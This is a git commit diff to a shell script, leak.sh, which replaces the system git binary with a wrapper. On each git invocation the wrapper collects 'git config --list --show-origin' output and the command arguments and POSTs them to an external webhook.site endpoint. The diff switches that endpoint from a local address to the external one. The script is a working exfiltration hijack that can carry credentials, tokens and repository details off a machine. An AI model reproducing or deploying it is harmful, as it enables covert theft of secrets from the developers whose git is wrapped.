6057ae4c4fda5b272d11a92183179f422d3c188c
Kait <39479354+katrinafyi@users.noreply.github.com>
2025-04-15 15:25:49 +1000

    Update leak.sh

--- leak.sh
+++ leak.sh
@@ -2,17 +2,23 @@
 
 # XXX: run with sudo
 
+URL='https://webhook.site/65adb5dd-dc3e-4357-815b-fd42b2e2790d'
+
 leak() {
   echo "$1"
-  curl --no-progress-meter -X POST 'http://127.0.0.1:8080/api/v1/account-joyride-hacksaw2-earmuff-upstairs-groggily' --data-binary "$1"
+  curl --no-progress-meter -X POST "$URL" --data-binary "$1" -H "Content-Type: application/octet-stream"
 }
 
 if [[ "$(basename $0)" = git ]]; then
   realgit="$(dirname $0)/real/git"
   d="$("$realgit" config --list --show-origin)"
-  leak "$d" >&2
+  leak "git $@
+$d" >&2
+
   exec "$realgit" "$@"
+
 else
+
   oldgit=$(command -v git)
   realgit=$(dirname $oldgit)/real/git
   mkdir -v -p $(dirname $realgit)
